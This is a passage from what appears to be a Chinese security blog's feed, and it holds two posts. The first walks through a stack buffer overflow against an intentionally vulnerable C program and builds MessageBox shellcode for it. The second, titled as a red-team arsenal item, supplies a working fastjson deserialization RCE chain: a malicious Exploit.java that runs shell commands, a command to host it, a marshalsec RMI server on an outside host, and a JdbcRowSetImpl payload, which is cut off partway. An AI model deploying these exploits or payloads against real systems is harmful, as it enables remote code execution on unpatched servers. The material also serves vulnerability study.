      <url>/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>本次主要记录缓冲器溢出的：原理、实现和shellcode的编写</p><p>详细的去理解原理，和底层开始写shellcode</p><p>本次实验的C代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"1234567"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span> <span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> authenticated;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">44</span>];</span><br><span class="line">authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="built_in">buffer</span>,password);<span class="comment">//over flowed here!</span></span><br><span class="line"><span class="keyword">return</span> authenticated;</span><br><span class="line">&#125; </span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">FILE * fp;</span><br><span class="line">LoadLibrary(<span class="string">"user32.dll"</span>);<span class="comment">//prepare for messagebox</span></span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(<span class="string">"password.txt"</span>,<span class="string">"rw+"</span>)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,password);</span><br><span class="line">valid_flag = verify_password(password);</span><br><span class="line"><span class="keyword">if</span>(valid_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"incorrect password!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>1、首先应该理解函数调用的知识，这个知识在上一部汇编基础介绍过</p><p>2、漏洞存在于 strcpy(buffer,password);这个函数，在拷贝时候没有检查字符串的大小，导致了越界写入，超出了预期的范围，导致栈内的内存溢出和破坏。</p><p>3、如下图所示，我们从buffer开始淹没数据，覆盖前栈ebp，将返回地址覆盖成 jmp esp，随后执行下一条指令，开始执行我们要执行的恶意shellcode</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAyMTA2MzYucG5n?x-oss-process=image/format,png" alt="image-20200630175547142"></p><h2 id="0x02-先找main函数"><a href="#0x02-先找main函数" class="headerlink" title="0x02 先找main函数"></a>0x02 先找main函数</h2><p>大概两种方法：</p><h3 id="第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数"><a href="#第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数" class="headerlink" title="第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数"></a>第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数</h3><p>对于这个题目来说，找到主函数可以用找字符串的方法来找，</p><p>右键查找所以的字符串</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzA0MDEucG5n?x-oss-process=image/format,png" alt="image-20200627230401048"></p><p>然后看见主函数运用的字符，直接点进去，就是主函数</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzAxMDgucG5n?x-oss-process=image/format,png" alt="image-20200627230108867"></p><h3 id="第二种：利用ida分析"><a href="#第二种：利用ida分析" class="headerlink" title="第二种：利用ida分析"></a>第二种：利用ida分析</h3><p>利用IDA来查找，加载程序自动找到主函数</p><p>双击main，进去 点一下空格，找到主函数，然后去od里面找对应就可以‘</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjcyMzA2NDEucG5n?x-oss-process=image/format,png" alt="image-20200627230641354"></p><h2 id="0x03-正常运行一下程序"><a href="#0x03-正常运行一下程序" class="headerlink" title="0x03 正常运行一下程序"></a>0x03 正常运行一下程序</h2><p>正常运行程序，找到verfiy函数，进入调试</p><p>buffer 是44字节的</p><p>先写入12341234123412341234123412341234123412341234，11个1234</p><p>把buff的占满看一下栈的结构</p><p>先确定我们要淹没的地址大小和位置</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMTIzMzYucG5n?x-oss-process=image/format,png" alt="image-20200628212336143"></p><h2 id="0x04-简单的破解"><a href="#0x04-简单的破解" class="headerlink" title="0x04 简单的破解"></a>0x04 简单的破解</h2><p>基于上面的分析，只要将返回地址覆盖为想要的地址就好了</p><p>回到主函数一看 成功的地址为 0x00401133</p><p>所以我们编写 覆盖此地址，注意后面的地址是要反着写的，因为是大顶机机制</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMjM4MzYucG5n?x-oss-process=image/format,png" alt="image-20200628223836346"></p><p>运行一下，成功跳过</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMjM1NDcucG5n?x-oss-process=image/format,png" alt="image-20200628223547169"></p><h2 id="0x04-shellcode编写"><a href="#0x04-shellcode编写" class="headerlink" title="0x04 shellcode编写"></a>0x04 shellcode编写</h2><h3 id="选用-jmp-esp-作为定位-shellcode-的跳板"><a href="#选用-jmp-esp-作为定位-shellcode-的跳板" class="headerlink" title="选用 jmp esp 作为定位 shellcode 的跳板"></a>选用 jmp esp 作为定位 shellcode 的跳板</h3><p>使用 jmp esp 做“跳板”的方法是最简单，也是最常用的定位 shellcode 的方法。</p><p>在实际的漏洞利用过程中，应当注意观察漏洞函数返回时所有寄存器的值。</p><p>往往 ESP 寄存器也会指向栈顶附近，用jmp esp可以确保下一条指令是在esp下一个位置，可以保证shellcode的稳定执行</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxNzU1NDcucG5n?x-oss-process=image/format,png" alt="image-20200630175547142"></p><h3 id="获取jmp-esp的地址"><a href="#获取jmp-esp的地址" class="headerlink" title="获取jmp esp的地址"></a>获取jmp esp的地址</h3><p>本次shellcode使用 简单的 jmp esp的方法跳转</p><p>利用下面函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; searchjmpesp.cpp : Defines the entry point for the console application.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">#include&quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt; </span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#define DLL_NAME &quot;user32.dll&quot; </span><br><span class="line">main() </span><br><span class="line">&#123; </span><br><span class="line">BYTE* ptr; </span><br><span class="line">int position,address; </span><br><span class="line">HINSTANCE handle; </span><br><span class="line">BOOL done_flag &#x3D; FALSE; </span><br><span class="line">handle&#x3D;LoadLibrary(DLL_NAME); </span><br><span class="line">if(!handle) </span><br><span class="line">&#123; </span><br><span class="line">printf(&quot;load dll error&quot;);</span><br><span class="line">&#125; </span><br><span class="line">ptr &#x3D; (BYTE*)handle; </span><br><span class="line">for(position &#x3D; 0; !done_flag; position++) </span><br><span class="line">&#123; </span><br><span class="line">try</span><br><span class="line">&#123; </span><br><span class="line">if(ptr[position] &#x3D;&#x3D; 0xFF &amp;&amp; ptr[position+1] &#x3D;&#x3D; 0xE4) </span><br><span class="line">&#123; </span><br><span class="line">&#x2F;&#x2F;0xFFE4 is the opcode of jmp esp</span><br><span class="line">int address &#x3D; (int)ptr + position;</span><br><span class="line">printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">catch(...)</span><br><span class="line">&#123; </span><br><span class="line">int address &#x3D; (int)ptr + position; </span><br><span class="line">printf(&quot;END OF 0x%x\n&quot;, address); </span><br><span class="line">done_flag &#x3D; true; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjkxNzA2NDcucG5n?x-oss-process=image/format,png" alt="image-20200629170646985"></p><h3 id="获取-MessageBoxA函数"><a href="#获取-MessageBoxA函数" class="headerlink" title="获取 MessageBoxA函数"></a>获取 MessageBoxA函数</h3><p>利用下面的程序获取 MessageBoxA的调用地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HINSTANCE LibHandle;</span><br><span class="line">MYPROC ProcAdd;</span><br><span class="line">LibHandle = LoadLibrary(<span class="string">"user32"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"user32=0x%x\n"</span>,LibHandle);</span><br><span class="line"></span><br><span class="line">ProcAdd=(MYPROC)GetProcAddress(LibHandle,<span class="string">"MessageBoxA"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"messagesbox=0x%x\n"</span>,ProcAdd);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMzIzMTQucG5n?x-oss-process=image/format,png" alt="image-20200628232314406"></p><h3 id="同理找到-ExitProcess"><a href="#同理找到-ExitProcess" class="headerlink" title="同理找到 ExitProcess"></a>同理找到 ExitProcess</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMzM1MzIucG5n?x-oss-process=image/format,png" alt="image-20200628233532091"></p><h3 id="获取到的全部-api的函数地址："><a href="#获取到的全部-api的函数地址：" class="headerlink" title="获取到的全部 api的函数地址："></a>获取到的全部 api的函数地址：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp esp &#x3D; 0x77e35b79</span><br><span class="line">user32&#x3D;0x77d10000</span><br><span class="line">messasbox&#x3D;0x77d507ea</span><br><span class="line">ExitProcess&#x3D;0x7c81cb12</span><br></pre></td></tr></table></figure><h3 id="编写汇编代码"><a href="#编写汇编代码" class="headerlink" title="编写汇编代码"></a>编写汇编代码</h3><p>使用C语言的 _ASM{} 可以直接编写汇编的代码</p><p>下面是弹窗的汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt; </span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">_asm&#123; </span><br><span class="line">sub sp,0x440</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx &#x2F;&#x2F; cut string</span><br><span class="line">push 0x6F657A20  &#x2F;&#x2F;zeo的ascll码</span><br><span class="line">push 0x6D612069</span><br><span class="line">mov eax,esp &#x2F;&#x2F;load address of failwest</span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov eax,0x77D507EA &#x2F;&#x2F; 系统获取的messageboxa的地址</span><br><span class="line">call eax &#x2F;&#x2F;call MessageboxA</span><br><span class="line">push ebx</span><br><span class="line">mov eax,0x7C81CB12     &#x2F;&#x2F;系统获取的exitprocess的地址</span><br><span class="line">call eax &#x2F;&#x2F;call exit(0)</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用vc6的反汇编功能，找出代码的机器码</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxNzU4MjgucG5n?x-oss-process=image/format,png" alt="image-20200630175828608"></p><p>转化后的机器码和解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">33 DB                xor         ebx,ebx                    </span><br><span class="line">53                   push        ebx                        </span><br><span class="line">68 20 7A 65 6F       push        6F657A20h                  </span><br><span class="line">68 69 20 61 6D       push        6D612069h                  </span><br><span class="line">8B C4                mov         eax,esp                    </span><br><span class="line">53                   push        ebx              MessageBoxA函数额 4 个参数按照从右向左的顺序入            </span><br><span class="line">50                   push        eax                        </span><br><span class="line">50                   push        eax                        </span><br><span class="line">53                   push        ebx                        </span><br><span class="line">B8 EA 07 D5 77       mov         eax,77D507EAh    调用 MessageBoxA，不同的机器这里的函数入口地址可能不同，按实际值填入         </span><br><span class="line">FF D0                call        eax                        </span><br><span class="line">53                   push        ebx                        </span><br><span class="line">B8 12 CB 81 7C       mov         eax,7C81CB12h    调用 exit(0)。           </span><br><span class="line">FF D0                call        eax</span><br></pre></td></tr></table></figure><h3 id="写入文件完整的payload"><a href="#写入文件完整的payload" class="headerlink" title="写入文件完整的payload"></a>写入文件完整的payload</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODE5MDEucG5n?x-oss-process=image/format,png" alt="image-20200630181901702"></p><h3 id="运行一下，成功！"><a href="#运行一下，成功！" class="headerlink" title="运行一下，成功！"></a>运行一下，成功！</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODMzMzQucG5n?x-oss-process=image/format,png" alt="image-20200630183334713"></p><h2 id="0x05-shellcode踩坑"><a href="#0x05-shellcode踩坑" class="headerlink" title="0x05 shellcode踩坑"></a>0x05 shellcode踩坑</h2><p>1、全部地址淹没后，就要把esp淹没，esp可以随便写</p><p>2、本次使用的是 jmp esp = 0x77e35b79 ，找到后但是编写shellcode的时候，因为是小端序</p><p>​ 所以填写的时候是反向的</p><p>​ 所以填写的时候是反向的</p><p>​ 所以填写的时候是反向的</p><p>本来是 0x77e35b79 ，那么写入的时候就是 79 5b e3 77 例如</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODIyMzQucG5n?x-oss-process=image/format,png" alt="image-20200630182234282"></p><p>3、虽然说是jmp esp指令需要注意 小端序，但是后面转化过的shellcode 就不需要了，因为已经转化过了，不用多此一举，已转化过了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODMyMDcucG5n?x-oss-process=image/format,png" alt="image-20200630183207368"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红队武器库:fastjson小于1.2.68全漏洞RCE利用exp</title>
      <link href="/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/"/>
      <url>/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01漏洞介绍"><a href="#0x01漏洞介绍" class="headerlink" title="0x01漏洞介绍"></a>0x01漏洞介绍</h1><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><h1 id="0x02影响范围"><a href="#0x02影响范围" class="headerlink" title="0x02影响范围"></a>0x02影响范围</h1><p>Fastjson &lt; 1.2.68</p><p>Fastjson爆出的绕过方法可以通杀1.2.68版本以下所有</p><h1 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h1><p>下面以Fastjson 1.2.47 为例子，因为vulhub有现成的环境十分方便</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P牛我用vulhub中的 1.2.47的docker   想测试doslog检查 fastjson 但是总是收到不到dnslog  但是正常的exp反弹shell就是可以我很疑惑    </span><br><span class="line">我的用法正确吗，用的这个&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;bouaiq.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="下面是流程示意图"><a href="#下面是流程示意图" class="headerlink" title="下面是流程示意图"></a>下面是流程示意图</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxMTE3NDUucG5n?x-oss-process=image/format,png" alt="image-20200704111745527"></p><p>主机A：存在fastjson反序列化漏洞的主机<br>主机C：为RMI/LDAP服务<br>主机B：为构造的恶意类（包含要执行的命令）</p><h3 id="在整个远程命令执行流程"><a href="#在整个远程命令执行流程" class="headerlink" title="在整个远程命令执行流程"></a>在整个远程命令执行流程</h3><p>1、黑客使用payload攻击主机A（该payload需要指定rmi/ldap地址）</p><p>2、主机A引发反序列化漏洞，发送了进行rmi远程发放调用，去连接主机C</p><p>3、主机C的rmi服务指定加载主机B的恶意java类，所以主机A通过主机C的rmi服务最终加载并执行主机B的恶意java类</p><p>4、主机A引发恶意系统命令执行</p><h1 id="0x04复现流程"><a href="#0x04复现流程" class="headerlink" title="0x04复现流程"></a>0x04复现流程</h1><p>根据上图流程和环境复现：</p><p>主机A： <a href="http://1.1.1.1:8090/" target="_blank" rel="noopener">http://1.1.1.1:8090</a> (存在Fastjson漏洞主机)<br>主机B： <a href="http://2.2.2.2:8888/" target="_blank" rel="noopener">http://2.2.2.2:8888</a> (恶意java类服务)<br>主机C： rmi://2.2.2.2:9999 (远程方法调用服务)</p><p>实际上主机B和C是一台机器不同端口）</p><h2 id="0x041-构造恶意方法"><a href="#0x041-构造恶意方法" class="headerlink" title="0x041 构造恶意方法"></a>0x041 构造恶意方法</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p><p>首先编译并上传命令执行代码</p><p>使用如下payload：</p><p>其中touch /zydx666为系统命令，可以根据自己需求随意修改</p><p>注意该文件名叫Exploit.java固定格式不能变</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Exploit() throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"touch /zydx666"</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(String[] args) throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在主机B中使用javac命令编译Exploit.java文件，生成一个Exploit.class文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure><p>然后在主机B启一个http服务，中间件随意，但是需要能访问到Exploit.class文件，这里使用python3临时启动一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server --bind <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure><h2 id="0x042-开启远程方法调用rmi服务"><a href="#0x042-开启远程方法调用rmi服务" class="headerlink" title="0x042 开启远程方法调用rmi服务"></a>0x042 开启远程方法调用rmi服务</h2><p>接下来在<strong>主机C</strong>开启rmi服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://1.1.1.1:8888/#Exploit" 9999</span><br></pre></td></tr></table></figure><p>marshalsec-0.0.3-SNAPSHOT-all.jar</p><p> 参考 <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></p><p>至此服务已经全部就绪</p><h2 id="0x043-发送payload"><a href="#0x043-发送payload" class="headerlink" title="0x043 发送payload"></a>0x043 发送payload</h2><p>接下来向<strong>主机A</strong>（存在漏洞机子）发送fastjson反序列化漏洞payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">8090</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 260</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    "a":&#123;</span></span><br><span class="line"><span class="comment">        "<span class="doctag">@type</span>":"java.lang.Class",</span></span><br><span class="line"><span class="comment">        "val":"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    "b":&#123;</span></span><br><span class="line"><span class="comment">        "<span 